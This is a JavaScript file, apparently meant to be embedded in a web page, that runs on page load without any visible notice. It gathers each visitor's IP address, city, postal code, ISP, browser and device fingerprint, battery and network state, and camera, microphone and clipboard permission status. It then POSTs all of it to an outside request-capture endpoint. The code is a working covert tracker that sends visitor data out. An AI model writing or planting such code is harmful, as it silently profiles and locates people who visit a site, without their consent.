async function sendUserInfo() {
  try {
    // Fetch IP and location info
    const ipRes = await fetch('https://ipapi.co/json/');
    const ipData = await ipRes.json();

    // Battery info
    let battery = null;
    if (navigator.getBattery) {
      const batt = await navigator.getBattery();
      battery = {
        charging: batt.charging,
        level: batt.level,
        chargingTime: batt.chargingTime,
        dischargingTime: batt.dischargingTime
      };
    }

    // Network connection info
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};

    // Browser plugins
    const plugins = Array.from(navigator.plugins).map(p => p.name);

    // Touch support
    const touchSupport = {
      maxTouchPoints: navigator.maxTouchPoints || 0,
      touchEvent: 'ontouchstart' in window,
      touchStart: window.TouchEvent ? true : false
    };

    // Performance timing (basic navigation timing)
    const perf = window.performance || null;
    const timing = perf ? perf.timing : null;

    // Permissions for camera, microphone, clipboard-read
    async function queryPermission(name) {
      try {
        const status = await navigator.permissions.query({name});
        return status.state;
      } catch {
        return 'unsupported';
      }
    }

    const cameraPerm = await queryPermission('camera');
    const micPerm = await queryPermission('microphone');
    const clipboardPerm = await queryPermission('clipboard-read');

    // Check storage availability
    function storageAvailable(type) {
      try {
        const storage = window[type];
        const x = '__storage_test__';
        storage.setItem(x, x);
        storage.removeItem(x);
        return true;
      } catch(e) {
        return false;
      }
    }

    // Build user info object
    const userInfo = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      languages: navigator.languages,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      availWidth: window.screen.availWidth,
      availHeight: window.screen.availHeight,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      innerWidth: window.innerWidth,
      innerHeight: window.innerHeight,
      deviceMemory: navigator.deviceMemory || null,
      hardwareConcurrency: navigator.hardwareConcurrency || null,
      maxTouchPoints: touchSupport.maxTouchPoints,
      touchEvent: touchSupport.touchEvent,
      touchStart: touchSupport.touchStart,
      plugins: plugins,
      connectionType: connection.effectiveType || null,
      downlink: connection.downlink || null,
      rtt: connection.rtt || null,
      saveData: connection.saveData || false,
      battery: battery,
      ip: ipData.ip,
      city: ipData.city,
      region: ipData.region,
      country: ipData.country_name,
      postal: ipData.postal,
      org: ipData.org,
      hostname: ipData.hostname,
      asn: ipData.asn,
      referrer: document.referrer,
      currentUrl: window.location.href,
      performanceTiming: timing,
      cameraPermission: cameraPerm,
      microphonePermission: micPerm,
      clipboardPermission: clipboardPerm,
      localStorageAvailable: storageAvailable('localStorage'),
      sessionStorageAvailable: storageAvailable('sessionStorage'),
      timestamp: new Date().toISOString()
    };

    await fetch('https://bbbb53.free.beeceptor.com', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(userInfo)
    });

    console.log('User info sent successfully');
  } catch (error) {
    console.error('Failed to send user info:', error);
  }
}

window.addEventListener('load', sendUserInfo);
